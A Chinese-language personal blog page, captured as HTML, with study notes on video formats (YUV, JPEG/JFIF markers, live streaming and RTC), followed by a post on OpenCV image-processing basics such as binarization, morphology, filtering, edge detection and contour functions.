<li><p>帧，为什么采用YUV格式？YUV是什么？</p>
<ul>
<li>在达到最大压缩率的情况下，能够保证对人眼感知的失真度最小。YUV的三个通道中，其中Y表示明亮度，也就是灰阶值；而U和V表示的则是色度。科学家研究发现，人眼对UV的敏感度最低，因此可以大比例地压缩UV两个通道的数值</li>
<li>为了向前兼容黑白电视</li>
</ul>
</li>
<li><p>YV12， YU12， NV12， NV21等，统称为<strong>视频的存储格式</strong>，也就是说，计算机是如何存储一帧视频的</p>
</li>
<li><p>视频编解码而衍生的帧名词</p>
<ul>
<li>I帧， P帧， B帧和IDR帧</li>
<li>GOP， Group Of Pictures，一般来说，指的是两个I帧之间的间隔</li>
<li>PTS, Presentation Time Stamp， 显示时间戳，它用来告诉播放器该什么时候显示这一帧的数据</li>
<li>DTS, Decoding Time Stamp， 解码时间戳，它的意义在于告诉解码器在什么时候解码这一帧的数据</li>
</ul>
</li>
</ul>
<hr>
<h2 id="JPG-JPEG（JFIF）-文件解码-文件结构"><a href="#JPG-JPEG（JFIF）-文件解码-文件结构" class="headerlink" title="JPG-JPEG（JFIF） 文件解码-文件结构"></a>JPG-JPEG（JFIF） 文件解码-文件结构</h2><ul>
<li><p>参考链接：<code>https://blog.csdn.net/ymlbright/</code></p>
</li>
<li><p><code>JPEG</code>文件使用的数据存储方式有多种。最常用的格式称为<code>JPEG</code>文件交换格式（<code>JPEG File Interchange Format，JFIF</code>）</p>
</li>
<li><p>而JPEG文件大体上由一个个数据段组成，数据段包含：标记码(Tag)、数据长度、数据</p>
</li>
<li><p>标记码由两个字节构成，其前一个字节是固定值<code>0xFF</code>，后一个字节则根据不同意义有不同数值</p>
</li>
<li><p>在每个标记码之前还可以添加数目不限的无意义的0xFF填充，也就说连续的多个0xFF可以被理解为一个0xFF，并表示一个标记码的开始。而在一个完整的两字节的标记码后，就是该标记码对应的压缩数据流，记录了关于文件的诸种信息。</p>
</li>
<li><p>常用的标记有<code>SOI、APP0、DQT、SOF0、DHT、DRI、SOS、EOI</code></p>
</li>
<li><p>注意，SOI等都是标记的名称。在文件中，标记是以标记码形式出现的。例如SOI的标记代码为0xFFD8，即在JPEG文件中的如果出现数据0xFFD8，则表示此处为一个SOI标记</p>
<ul>
<li>SOI  （0xFFD8） – 代表JFIF图像数据的开始</li>
<li>APP0 （0xFFE0） – 应用程序标记 0 </li>
<li>APPn （0xFFEn） – 拓展应用程序标记 2~15， 为其他应用程序保留 </li>
<li>DQT  （0xFFDB） – 量化表，存储了对扫描数据进行量化的 8*8 矩阵</li>
<li>SOFx （0xFFCx） – 图像帧开始</li>
<li>DHT  （0xFFC4） – Huffman表，存储了对扫描数据进行压缩的Huffman表，共4张，DC直流2张，AC交流2张</li>
<li>SOS  （0xFFDA） – 扫描数据开始 </li>
<li>scanData       – 图像的压缩数据，为了不与之前的标记码（Tag）混淆，数据中遇到 0xFF 时，需要进行判断<ul>
<li>0xFF00：表示 0xFF 是图像数据的组成部分</li>
<li>0xFFD0~0xFFD7：RSTn标记，遇到标记时，对差分解码变量进行重置（归0）</li>
<li>0xFFD9：图像结束标记，图像压缩数据至此结束</li>
</ul>
</li>
<li>EOI  （0xFFD9） – 代表JFIF图像数据的结束，即文件结尾</li>
</ul>
</li>
</ul>
<hr>
<h2 id="腾讯-开发者社区"><a href="#腾讯-开发者社区" class="headerlink" title="腾讯 开发者社区"></a>腾讯 开发者社区</h2><ul>
<li><p>文章链接：<code>https://cloud.tencent.com/developer/article/1385273</code></p>
</li>
<li><p>就音频而言，无论是算法多样性，Codec种类还是音频编解码复杂程度都远远比视频要高。</p>
</li>
<li><p>视频的Codec目前还主要是<strong>以宏块为处理单元</strong>，预测加变换的混合编码框架，例如H.264和H.265都是在这一框架下</p>
</li>
</ul>
<h3 id="直播和点播"><a href="#直播和点播" class="headerlink" title="直播和点播"></a>直播和点播</h3><ul>
<li><p>从广义上来讲，直播和点播都是一种视频播放场景</p>
</li>
<li><p>如果想要简单地区分二者，确实可以通过判断当前播放的视频画面是不是实时的来区分</p>
<ul>
<li>如果是实时的画面就是直播，</li>
<li>如果不是实时的画面就是点播</li>
</ul>
</li>
<li><p>直播</p>
<ul>
<li>视频直播播放的视频内容是实时的视频画面，视频源是实时的媒体流。</li>
<li>视频直播的播放内容稍纵即逝，无法回退和快进。</li>
<li>日常生活中的视频直播场景非常多，比如直播带货、视频会议、赛事直播等</li>
</ul>
</li>
<li><p>点播</p>
<ul>
<li>视频点播播放的视频内容是非实时的视频画面，</li>
<li>视频源是已经存在的视频文件或者媒体源，可以多次使用，可以回退和快进。</li>
<li>日常生活中的视频点播场景也非常多，比如有线电视、网络点播、短视频等</li>
</ul>
</li>
<li><p>直播和点播的工作流程</p>
<ul>
<li>视频直播会<strong>涉及一个比较完整的视频处理流程</strong>，包括视频画面和声音采集、视频编码、组包发送、网络传输、收包解包、视频解码、视频渲染和声音播放等</li>
<li>视频点播包括的流程就比较少了，一般只涉及文件读取、网络传输、视频解码、视频渲染和声音播放等流程，不会涉及视频画面和声音采集、视频编码、组包</li>
</ul>
</li>
<li><p>技术架构</p>
<ul>
<li>视频直播，<strong>常见的低延时方案大多是 RTC （Real time communication）方案</strong>，比如 WebRTC；大会直播类的场景一般是 CDN 方案，常用 rtmp、hls 等流媒体协议方案</li>
<li>视频点播，常用的有电视信号和网络协议，比如 http，https 等，视频格式有 m3u8、mp4、flv、mkv、mxf 等。由于上述网络协议和传输信号的差异，视频直播和视频点播的播放器方案有所不同，也是二者的显著差异之一</li>
</ul>
</li>
</ul>
<hr>
<h2 id="RTC"><a href="#RTC" class="headerlink" title="RTC"></a>RTC</h2><h3 id="什么是RTC？"><a href="#什么是RTC？" class="headerlink" title="什么是RTC？"></a>什么是RTC？</h3><ul>
<li><p>RTC（Real time communication）实时通信，是实时音视频的一个简称，我们常说的RTC技术一般指的是WebRTC技术，已经被 W3C 和 IETF 发布为正式标准</p>
</li>
<li><p>由于几乎所有主流浏览器都支持 WebRTC 标准 API ，因此也让浏览器之间无插件化的音视频互通成为可能， 大大降低了音视频开发的门槛，开发者只需要调用 WebRTC API 即可快速构建出音视频应用</p>
</li>
<li><p>更广义的RTC技术，不单单局限于音视频，包括IM(Instant messaging,即时通讯)、图片、白板、文件共享等富媒体在内的实时交互也属于RTC技术范畴。</p>
</li>
</ul>
<h3 id="一套完善的RTC服务应用的技术"><a href="#一套完善的RTC服务应用的技术" class="headerlink" title="一套完善的RTC服务应用的技术"></a>一套完善的RTC服务应用的技术</h3><ul>
<li><p>RTMP只是TCP上的一个标准协议，所以接入是一个标准体系，推流端可以是OBS( Open Broadcaster Software)这种直播软件工具，也可自开发rtmp推流工具，播放端可以是Flash播放器（Adobe 2020 12月份已经弃用）、服务端有技术成熟的CDN(Content Delivery Network，即内容分发网络)技术和设施进行分发、Native的播放器或者flv.js&#x2F;hls.js这种开源播放器组件，遵循rtmp、flv、hls标准即可，接入成本比较低。而一个完善的RTC服务应用，需要从推流端、服务端、到拉流端，一整套完整的全链路闭环技术。</p>
</li>
<li><p>互动连麦+服务端转推rtmp至CDN，CDN分发给观众。</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/OpenCV/opencv_0_%E9%A2%86%E5%9F%9F%E7%9F%A5%E8%AF%86/2024-05-22-opencv_5_%E5%9B%BE%E5%83%8F%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/OpenCV/opencv_0_%E9%A2%86%E5%9F%9F%E7%9F%A5%E8%AF%86/2024-05-22-opencv_5_%E5%9B%BE%E5%83%8F%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">OpenCV 图像理论基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OpenCV/" itemprop="url" rel="index"><span itemprop="name">OpenCV</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>一、RGB模型与YUV模型</p>
<ol>
<li>RGB模型<br> 物理三基色分别是红（Red）、绿（Green）、蓝（Blue）。现代的显示器技术就是通过组合不通强度的红绿蓝三原色，来达成几乎任何一种可见光的颜色。<br> 在图像存储中，通过记录每个像素的红绿蓝强度，来记录图像的方法，称为RGB模型（RGB Model）。<br> 常见的图片格式中，PNG和BMP这两种就是基于RGB模型的。</li>
<li>YUV模型<br> YUV模型，又被称为亮度-色度模型。它是通过数学转换，将RGB三通道转换为一个代表亮度的通道（Y），和两个代表色度的通道（UV）来记录图像的模型</li>
</ol>
<p>二、转换过程</p>
<ol>
<li><p>RGB2YUV<br> 在做RGB信号到YUV信号的转换时，一般是先转换到YUV444格式，然后再将UV信号的分辨率降低，变成所需要的格式</p>
</li>
<li><p>YUV2RGB<br> 在播放视频或显示图像的时候，需要将YUV信号转换成RGB信号。这个步骤称为渲染（Rendering）<br> 在做YUV到RGB的转换时，首先需要将缩水的UV信号的分辨率拉升到与Y信号相同的分辨率，然后再转换到RGB信号。</p>
</li>
<li><p>公式：<br> Y &#x3D; 0.299 * R + 0.587 * G + 0.114 * B<br> U &#x3D; -0.147 * R - 0.289 * G - 0.436 * B<br> V &#x3D; 0.615 * R - 0.515 * G - 0.100 * B </p>
<p> R &#x3D; Y + 1.1140 * V<br> G &#x3D; Y - 0.395 * U - 0.581 * V<br> B &#x3D; Y + 2.032 * U</p>
</li>
</ol>
<p>收集箱：</p>
<ol>
<li>Opencv没有提供BGR转NV12，但是提供了NV12转RGB：cvtColor(src,dst,CV_YUV2BGR_NV12);</li>
<li>摄像机拍摄出来的视频很多都是用YUV格式保存，颜色空间的转换必须在RGB色彩模型上才能完成，所以第一步是将YUV颜色模型转换为RGB颜色模型</li>
<li>split(image,yuvchannel);<br>merge(rgbchannel,3,img2);</li>
</ol>
<h1 id="二值化"><a href="#二值化" class="headerlink" title="二值化"></a>二值化</h1><ol>
<li>二值化，指将256阶的灰度图通过合适的阈值，转换为黑白二值图，即像素值只有0和1两种（或者是0和255）。</li>
<li>目的：通常为将图像的前后景进行分割，以便进行进一步的处理</li>
<li>二值化的关键在于<strong>阈值的选择</strong>，合理的阈值应该尽可能的分离前景和后景</li>
<li>图像二值化的算法的设计目的在于选择一个合理的阈值。在选择阈值的时候，应该是一种自适应的选择，不需要手动调节。</li>
<li>图像二值化阈值选择算法：<ol>
<li>P-tile算法（最古老）</li>
<li>最小误判概率法</li>
<li>大津法（OTSU）（最常用）</li>
<li>局部自适应二值化（Chow and Kaneko algorithm）：有一些场合，单一的阈值不可能将前景和后景分开，颜色不呈现双峰性<ol>
<li>将图像分成多个子区域，每个局部区域内的像素满足双峰性</li>
<li>对每个区域求解阈值</li>
<li>通过插值法计算每个像素的阈值</li>
</ol>
</li>
</ol>
</li>
</ol>
<h1 id="图像形态学"><a href="#图像形态学" class="headerlink" title="图像形态学"></a>图像形态学</h1><ol>
<li>图像形态学的理论基础为<strong>集合论</strong></li>
<li>图像中的集合代表二值图像或灰度图像的形状。如二值图像的前景像素集合</li>
<li>图像形态学的作用是简化图像数据，保持基本形状特性，去除不相干的结构等</li>
<li>基本运算包括：膨胀、腐蚀、开运算、闭运算、顶帽运算和底帽运算等。<ol>
<li>腐蚀运算：去除一些粘连图像，去除噪声</li>
<li>膨胀运算：由于无法实现理想的二值化，使得原本连通的像素集合被分成不通的连通域，从而影响目标物的提取。可通过膨胀运算使其恢复连通性   </li>
<li>膨胀和腐蚀运算的问题：使图像形状发生改变，目标物体变形，对识别时的特征提取会造成影响</li>
<li>开运算：先对图像进行腐蚀处理，再对结果进行膨胀处理。先腐蚀再膨胀的结果并不是恢复原状，而是会消除黏连部分，同时不影响其他部分的形状</li>
<li>闭运算：先对图像进行膨胀处理，再对膨胀结果进行腐蚀处理。小的裂缝，小孔等被填充，并不影响原来的形状</li>
<li>顶帽和底帽变换<ol>
<li>顶帽变换：原图 - 灰度开运算结果（灰度腐蚀+灰度膨胀）<ol>
<li>保留比结构元素小的部分</li>
<li>保留比周围环境亮的像素</li>
</ol>
</li>
<li>底帽变换：灰度闭运算（灰度膨胀+灰度腐蚀） - 原图<ol>
<li>保留比结构元素小的部分</li>
<li>保留比周围环境暗的像素</li>
</ol>
</li>
<li>功能：消除背景光照不均匀的现象，从而改善在二值化时的效果，同样结构元素的尺寸大小要根据目标物体的大小进行选择</li>
</ol>
</li>
</ol>
</li>
</ol>
<h1 id="空间滤波"><a href="#空间滤波" class="headerlink" title="空间滤波"></a>空间滤波</h1><ol>
<li>卷积的基本概念：<ol>
<li>空间滤波是一种采用滤波处理的影响增强方法。其理论基础是空间卷积和空间相关。目的是改善影响质量，包括去除高频噪声与干扰，及影响边缘增强、线性增强以及去模糊等。分为低通滤波（平滑化）、高通滤波（锐化）和带通滤波。</li>
<li>一维卷积实例：对数字图像做卷积操作其实就是利用卷积核在图像上滑动，将图像点上的像素灰度值与对应的卷积核上的数值相乘，然后将所有相乘后的值相加作为卷积核中间像素对应的图像上像素的灰度值，并最终滑动完成所有图像的过程。</li>
<li>二维卷积实例：对数字图像做卷积操作其实就是利用卷积核在图像上滑动，将图像点上的像素灰度值与对应的卷积核上的数值相乘，然后将所有相乘后的值相加作为卷积核中间像素对应的图像上像素的灰度值，并最终滑动完成所有图像的过程。</li>
</ol>
</li>
<li>卷积的应用<ol>
<li>均值滤波<ol>
<li>两种基本的平滑卷积：平滑卷积，通过高斯分布加权的高斯平滑卷积</li>
<li>效果：与周围差距较大的值趋向于与周围相似，整体值趋向于平均化</li>
</ol>
</li>
<li>中值滤波：中值是一种非线性滤波，不需要指定卷积核，只需要指定滤波器尺寸<ol>
<li>效果：一些和周围像素值差异特别大的点被周围的像素值代替。表现在图像就是一些特别亮或者特别暗的点被周围的像素值代替。</li>
</ol>
</li>
<li>均值滤波和中值滤波通常的作用是：降噪，而图像中两种常见的噪声：椒盐噪声和高斯噪声<ol>
<li>椒盐噪声：它是一种随机出现的白点或者黑点，即亮的区域有黑色像素或者在暗的区域有白色像素（或者两者皆有）。椒盐噪声的成因是图像信号受到突如其来的强烈干扰而产生的。椒盐噪声通常使用<strong>中值滤波</strong>降噪</li>
<li>高斯噪声：主要来源是在采集过程中产生的，例如由于照明不良或者高温引起的传感器噪声。其概率分布上符合正态分布。高斯噪声通常使用<strong>平滑滤波</strong>进行降噪。</li>
</ol>
</li>
</ol>
</li>
</ol>
<h1 id="几何变换"><a href="#几何变换" class="headerlink" title="几何变换"></a>几何变换</h1><ol>
<li>图像的几何变换，又称空间变换，是图形处理的一个方面，是各种图形处理算法的基础。<ol>
<li>具体步骤：它将一幅图像中的坐标位置映射到另一幅图像中的新坐标位置，其实质是改变像素的空间位置，估算新空间位置上的像素值。</li>
<li>几何变换算法一般包括：空间变换运算和插值算法</li>
</ol>
</li>
<li>二维图像的几何运算矩阵：<ol>
<li>齐次坐标：对一个在二维平面上的点（x，y），对任意非零实数Z，三元组（xZ, yZ, Z）即称之为该店的齐次坐标。使用n+1维，来表示n维的坐标<ol>
<li>目的：统一坐标的加法运算和乘法运算，运算时提高效率，表示无穷远的点，可以控制尺度的缩放，当z&#x3D;0的时候，表示无穷远的点。</li>
</ol>
</li>
<li>比例缩放：图像的比例缩放是指将给定的图像在x轴方向按比例缩放a倍，在y轴方向按比例缩放b倍，从而获得一幅新的图像。<ol>
<li>如果a&#x3D;b，称这样的比例缩放为图像的权比例缩放</li>
<li>如果a不等于b，图像的比例缩放会改变原始图像的像素间的相对位置，产生几何畸变</li>
</ol>
</li>
<li>旋转和镜像</li>
<li>错切和复合变换</li>
<li>投影变换</li>
</ol>
</li>
</ol>
<h1 id="视频图像处理"><a href="#视频图像处理" class="headerlink" title="视频图像处理"></a>视频图像处理</h1><ol>
<li>固定背景的视频图像处理<ol>
<li>背景差分法：</li>
<li>高斯背景建模：为每一个像素计算了一个单独的阈值</li>
<li>阴影处理</li>
<li>背景更新</li>
</ol>
</li>
<li>移动背景的视频图像处理：光流法和特定物体目标检测<ol>
<li>光流法：<ol>
<li>光流是空间运动物体在观测成像面上的像素运动的瞬时速度。光流场是指图像中所有像素点构成的一种二维瞬时速度场。1981年，Horn&amp;Schunck创造性地将二维速度场和亮度变化相结合，引入基本光流约束方程及整体平滑约束条件，建立了光流计算的基本模型。</li>
<li>光流法的标准测试数据集：<a target="_blank" rel="noopener" href="http://vision.middlebury.edu/flow/">http://vision.middlebury.edu/flow/</a></li>
<li>光流法实际上是计算图像中的像素在两帧之间的运动向量</li>
</ol>
</li>
</ol>
</li>
</ol>
<h1 id="图像识别（涉及到识别，通常分为两大体系：SVM体系和神经网络体系）"><a href="#图像识别（涉及到识别，通常分为两大体系：SVM体系和神经网络体系）" class="headerlink" title="图像识别（涉及到识别，通常分为两大体系：SVM体系和神经网络体系）"></a>图像识别（涉及到识别，通常分为两大体系：SVM体系和神经网络体系）</h1><ol>
<li>SVM体系：手动去设计特征，然后根据分类器进行分类</li>
<li>神经网络体系：通过训练自动收敛特征进行识</li>
</ol>
<h1 id="琐碎基础概念"><a href="#琐碎基础概念" class="headerlink" title="琐碎基础概念"></a>琐碎基础概念</h1><h2 id="边缘识别（边缘检测）"><a href="#边缘识别（边缘检测）" class="headerlink" title="边缘识别（边缘检测）"></a>边缘识别（边缘检测）</h2><ol>
<li>边缘识别又称边缘检测，是模仿人类视觉的一个过程。</li>
<li>人类视觉系统认识目标的过程分两步：首先，把图像边缘与背景分裂出来；然后，才能知觉到图像的细节，辨认出图像的轮廓。在检测物体边缘时，先对其轮廓点进行粗略检测，然后通过链接规则把原来检测到的轮廓点链接来，同时也检测和连接遗漏的边界点及去除虚假的边界。</li>
<li>边缘检测的目的是去发现图像中关于形状和反射或透射比的信息，是图像处理、图像分析、模式识别、计算机视觉以及人类视觉的基本步骤之一。</li>
<li>边缘识别的实质是采用某种算法来提取出图像中的对象和背景间的交界线。图像灰度的变化情况可以用图像灰度分布的梯度来反应，因此我们可以利用局部图像微分技术获得边缘检测算子</li>
<li>边缘识别步骤及要求：<ol>
<li>图像滤波：边缘检测算法主要是基于图像亮度的一阶和二阶导数，但是导数的计算对噪声很敏感，因此必须使用滤波器来改善与噪声有关的边缘检测器的性能。（中值滤波、高斯滤波、均值滤波）</li>
<li>图形增强：增强边缘的基础是确定图像各点邻域强度的变化值。增强算法可以将邻域强度值有显著变化的点突出显示。</li>
<li>图像检测：在图像中有许多点的梯度幅值比较大，而这些点在特定的应用领域并不都是边缘，应该用某些方法来确定哪些是边缘点。最简单的边缘检测判据是梯度幅值阈值判据。</li>
<li>图像定位：如果某一应用场合要求确定边缘位置，则边缘的位置可以在子像素分辨率上来估计，边缘的方位也可以被估计出来。</li>
</ol>
</li>
<li>传统边缘识别方法：<ol>
<li>基于灰度直方图</li>
<li>基于梯度：梯度对应一阶导数，梯度算子就是一阶导数算子。在边缘灰度值过渡比较尖锐，且在图像噪声比较小时，梯度算子工作的效果较好，而且对施加的运算方向不予考虑，在实际中常用小区域模板进行卷积来近似计算。根据模板的大小和元素值的不用，已经提出许多不同的算子。常见的有：Roberts边缘检测算子、Sobel边缘检测算子、Prewitt边缘检测算子、Robinson边缘检测算子、Laplacan边缘检测算子、<strong>Canny边缘检测算子</strong>、LOG滤波器（Marr-Hildreth算子）等。<ol>
<li>Canny边缘检测算子：基本思想是先将图像使用高斯函数Gauss进行平滑，再由一阶微分的极大值确定边缘点。二阶微分的零交叉点不仅对应着一阶导数的极大值，而且也对应着一阶导数的极小值。换句话说，图像中灰度变化剧烈的点与变化缓慢的点都对应着二阶导数零交叉点。因此，Canny算子可能会引入伪边缘点。</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="OpenCV中的轮廓"><a href="#OpenCV中的轮廓" class="headerlink" title="OpenCV中的轮廓"></a>OpenCV中的轮廓</h2><ol>
<li>什么是轮廓？<ol>
<li>轮廓可以简单地解释为：连接具有相同颜色或强度的所有连续点（沿边界）的曲线。轮廓是用于形状分析以及对象检测和识别的有用工具。</li>
<li>为了获得更高的准确性，请使用二进制图像。因此，在找到轮廓之前，请应用阈值或者Canny边缘检测</li>
<li>在OpenCV中，找到轮廓就像从黑色背景中找到白色物体，因此请记住：要找到的对象应该是白色，背景应该是黑色。</li>
</ol>
</li>
<li>轮廓特征<ol>
<li>矩：图像矩可以帮助计算某些特征，例如物体的重心，物体的面积</li>
<li>轮廓面积：轮廓区域由函数contourArea（）给出</li>
<li>轮廓周长（弧长）：可以使用arcLength（）函数找到</li>
<li>轮廓近似：根据指定的精度，它可以将轮廓形状近似为顶点数量较少的其他形状。它是Douglas-Peucker算法的实现</li>
<li>凸包：凸包外观看起来与轮廓相似，甚至在某些情况下两者提供相同的结果。在这里，使用convexHull（）函数检查曲线是否存在凹凸缺陷并对其进行矫正。一般而言，凸曲线是始终凸出或至少平坦的曲线，如果在内部凸出，则称为凸度缺陷</li>
<li>边界矩形：<ol>
<li>直角矩形：它是一个直角矩形，不考虑对象的旋转。因此，边界矩形的面积将不会最小，可以通过boundingRect（）找到</li>
<li>旋转矩形：在这里，边界矩形是用最小面积绘制的，因此它也考虑了旋转的因素。使用函数minAreaRect（）得到，它返回一个Box2D结构，其中包含：中心（x,y），（宽度，高度），旋转角度）。但是要绘制此矩形，需要矩形的四个角，通过函数boxPoints（）获得</li>
</ol>
</li>
<li>最小外圆：使用函数minEnclosingCircle（）找到对象的外接圆，它是一个以最小面积完全覆盖对象的圆圈。</li>
<li>拟合椭圆：使用函数fitEllipse（），ellipse（）函数</li>
</ol>
</li>
<li>轮廓属性：<ol>
<li>长宽比：它是对象边界矩形的宽度与高度的比率</li>
<li>范围：它是轮廓区域与边界矩形区域的比率</li>
<li>固实性：它是轮廓面积与其凸包面积的比率</li>
<li>等效直径：它是面积与轮廓面积相同的圆的直径</li>
<li>方向：它是物体指向的角度</li>
<li>遮罩和像素点</li>
<li>最大值、最小值及其位置：</li>
<li>平均颜色或平均强度：</li>
<li>极端点：它是指对象的最顶部,最底部,最右侧和最左侧的点</li>
</ol>
</li>
<li>轮廓：更多功能：<ol>
<li>凸包缺陷：物体与该船体的任何偏离都可以视为凸包缺陷，使用convexityDefect（）来查找</li>
<li>点多边形测试：此功能查找图像中的点与轮廓之间的最短距离</li>
<li>匹配形状：matchShapes（）函数能够比较两个形状或两个轮廓，并返回显示相似度的度量。结果月底，匹配越好。</li>
</ol>
</li>
<li>轮廓层次：<ol>
<li>什么是轮廓层次：<ol>
<li>通常使用findContours（）函数来检测图像中的对象，有时对象位于不通的位置。但是在某些情况下，某些形状位于其他形状内，就像嵌套的数字一样。在这种情况下，我们将外部的一个称为父级，将内部的一个称为子级。这样，图像中的轮廓彼此之间就具有某种关系。并且我们可以指定一个轮廓如何相互连接，例如：是其他轮廓的子轮廓，还是父轮廓等。这种关系的表示称为层次结构。</li>
</ol>
</li>
</ol>
</li>
<li>OpenCV中的函数： <ol>
<li>void findContours(InputArray image, OutputArrayOfArrays contours, OutputArray hierarchy, int mode, int method, Point offset &#x3D; Point())<ol>
<li>轮廓检测，从二进制图片中找到轮廓。</li>
<li>参数<ol>
<li>image：源图片</li>
<li>contours：检测到的轮廓，每个轮廓都存储为点向量。</li>
<li>hierarchy：可选的输出向量，包含有关图像拓扑的信息。指定子轮廓和父轮廓等。</li>
<li>mode：轮廓检测模式<ol>
<li>RETR_EXTERNAL ：仅检索极端外部轮廓</li>
<li>RETR_LIST ：检索所有轮廓而不建立任何层次关系</li>
<li>RETR_CCOMP ：检索所有轮廓并将他们组织成两级层次结构</li>
<li>RETR_TREE ：检索所有轮廓并重建嵌套轮廓的完整层次</li>
</ol>
</li>
<li>method：轮廓近似法<ol>
<li>CHAIN_APPROX_NONE ：绝对存储所有轮廓点</li>
<li>CHAIN_APPROX_SIMPLE ：压缩水平、垂直和对角线段，只留下它们的端点</li>
<li>CHAIN_APPROX_TC89_L1 ：应用Teh-Chin 炼近似算法的一种风格</li>
<li>CHAIN_APPROX_TC89_KCOS ：应用Teh-Chin 炼近似算法的一种风格</li>
</ol>
</li>
<li>offset：每个轮廓点移动的可选偏移量。</li>
</ol>
</li>
</ol>
</li>
<li>void approxPloyDP(InputArray curve, OutputArray approxCurve, double epsilon, bool closed);<ol>
<li>用另一个具有较少顶点的曲线&#x2F;多边形来逼近一条曲线&#x2F;多边形，使它们之间的距离小于或等于指定的精度。</li>
<li>参数<ol>
<li>curve：存储在vector或Mat中的2D点的输入向量</li>
<li>approxCurve：近似的结果。该类型与输入曲线的类型相匹配</li>
<li>epsilon：指定近似精度的参数。这是原始曲线与其近似值之间的最大距离</li>
<li>closed：如果为真，则近似曲线是闭合的，否则不是闭合的</li>
</ol>
</li>
</ol>
</li>
<li>Rect boundingRect(InputArray array);<ol>
<li>计算点集或灰度图像的非零像素的右上边界矩形。该函数计算并返回灰度图像的指定点集或非零像素的最小上边界矩形</li>
<li>参数：array，输入灰度图像或二维点集，存储在vector或Mat中</li>
</ol>
</li>
<li>void rectangle(InputOutputArray img, Point pt1, Point pt2, const Scalar&amp; color, int thickness &#x3D; 1, int lineType &#x3D; LINE_8, int shift &#x3D; 0);<ol>
<li>绘制一个简单的、填充的直角矩形</li>
<li>参数<ol>
<li>img：图像</li>
<li>pt1：矩形的顶点</li>
<li>pt2：与pt1相对的矩形的顶点</li>
<li>color：矩形颜色或亮度（灰度图像）</li>
<li>thickness：构成矩形的线条粗细</li>
<li>lineType：线的类型（线路连通性）<ol>
<li>LINE_4：4连线</li>
<li>LINE_8：8连线</li>
<li>LINE_AA ：抗锯齿线</li>
</ol>
</li>
<li>shift：坐标中的小数位数</li>
</ol>
</li>
</ol>
</li>
<li>void drawContours(InputOutputArray image, InputArrayOfArrays contours, int contourldx, const Scalar&amp; color, int thickness &#x3D; 1, int lineType &#x3D; LINE_8, InputArray &#x3D; hierarchy &#x3D; noArray(), int maxLevel &#x3D; INT_MAX, Point offset &#x3D; Point());<ol>
<li>绘制轮廓或填充轮廓。如果thickness&gt;&#x3D;0，该函数在图像中绘制轮廓，如果thickness &lt; 0，则填充轮廓所包围的区域。</li>
<li>参数：<ol start="3">
<li>image：目标图像</li>
<li>contours：所有输入轮廓。每个轮廓都存储为一个点向量</li>
<li>contourldx：指定要绘制的轮廓的参数。如果为负数，则绘制所有轮廓。</li>
<li>color：轮廓的颜色</li>
<li>thickness：轮廓线的粗细</li>
<li>lineType：线路连通性<ol>
<li>LINE_4：4连线</li>
<li>LINE_8：8连线</li>
<li>LINE_AA ：抗锯齿线</li>
</ol>
</li>
<li>hierarchy：有关层次结构的可选信息</li>
<li>maxLevel：绘制轮廓的最大级别。<ol>
<li>如果为0，则仅绘制指定的轮廓。</li>
<li>如果为1，则函数绘制和所有嵌套轮廓</li>
<li>如果为2，则函数绘制轮廓、所有嵌套轮廓、所有嵌套到嵌套的轮廓，以此类推。</li>
<li>仅当存在可用层次结构的时候才考虑此参数</li>
</ol>
</li>
<li>offset：可选的轮廓移动参数。将所有绘制的轮廓移动指定的offset &#x3D; (dx, dy)。</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h1 id="运动目标检测：背景差分法（Background-subtraction）"><a href="#运动目标检测：背景差分法（Background-subtraction）" class="headerlink" title="运动目标检测：背景差分法（Background subtraction）"></a>运动目标检测：背景差分法（Background subtraction）</h1><ol>
<li>背景差分法，又称背景减法，常用于检测视频图像中的运动目标，是目前目标检测的主流方法之一。这种方法是通过把当前帧（current frame）的每一个像素与背景模板（background model）的每一个像素做减法，来判断这个像素是属于前景还是背景。</li>
<li>基本原理：将图像序列中的当前帧和已经确定好或实时获取的背景参考模型（背景图像）做减法，找不同，计算出与背景图像像素差异超过一定阈值的区域作为运动区域，从而来确定运动物体位置、轮廓、大小等特征，非常适用于摄像机静止的场景。</li>
<li>背景：<ol>
<li>背景差分法的性能好坏很大程度上取决于背景模型的建模、获取和更新方法，背景图像的建模和模拟的准确程度，将直接影响到检测的效果。</li>
<li>什么是背景？<ol>
<li>对于一个稳定的监控场景而言，在没有运动目标，光照没有变化的情况下，视频图像中各个像素点的灰度值是符合随机概率分布的。由于摄像机在采集图像的过程中，会不可避免地引入噪声，这些灰度值以某一个均值为基准线，在附近做一定范围内的随机震荡，这种场景就是所谓的背景。</li>
</ol>
</li>
</ol>
</li>
